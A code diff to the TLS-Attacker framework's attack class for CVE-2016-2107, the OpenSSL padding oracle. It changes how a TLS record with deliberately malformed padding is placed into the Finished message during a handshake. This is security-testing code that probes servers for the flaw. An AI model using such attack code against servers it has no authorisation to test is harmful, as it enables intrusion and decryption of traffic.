@@ -30,6 +30,7 @@ import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
+import de.rub.nds.tlsattacker.tls.workflow.action.SendAction;
 import java.util.LinkedList;
 import java.util.List;
 import org.apache.logging.log4j.LogManager;
@@ -72,11 +73,14 @@ public class Cve20162107Attacker extends Attacker<Cve20162107CommandConfig> {
                 tlsContext);
 
         WorkflowTrace trace = tlsContext.getWorkflowTrace();
-
-        FinishedMessage finishedMessage = (FinishedMessage) trace
-                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.FINISHED);
+        SendAction sendAction = trace.getFirstConfiguredSendActionWithType(HandshakeMessageType.FINISHED);
+        // We need two Records, one for the CCS message and one with finished
+        // message with the modified padding
+        List<Record> records = new LinkedList<>();
         Record record = createRecordWithBadPadding();
-        finishedMessage.addRecord(record);
+        records.add(new Record());
+        records.add(record);
+        sendAction.setConfiguredRecords(records);
 
         // Remove last two server messages (CCS and Finished). Instead of them,
         // an alert will be sent.
